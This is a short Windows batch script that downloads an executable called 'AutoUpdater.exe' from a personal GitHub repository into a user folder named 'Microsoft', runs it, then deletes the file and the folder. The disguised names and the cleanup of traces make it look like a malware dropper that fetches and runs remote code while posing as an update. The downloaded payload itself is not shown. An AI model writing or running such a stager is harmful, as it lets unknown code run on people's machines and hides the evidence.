@echo off
set "file=AutoUpdater.exe"
set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
set "docPath=%USERPROFILE%\Microsoft"

:: Ensure the directory exists
if not exist "%docPath%" mkdir "%docPath%"

:: Download the file
curl -L %url% -o "%docPath%\%file%"

:: Execute the file
cd /d "%docPath%"
start /wait "" "%file%"

:: Delete the file
del /q "%file%"

:: Attempt to remove the directory, will only succeed if it is empty
cd /d "%USERPROFILE%"
rmdir /q /s "%docPath%"
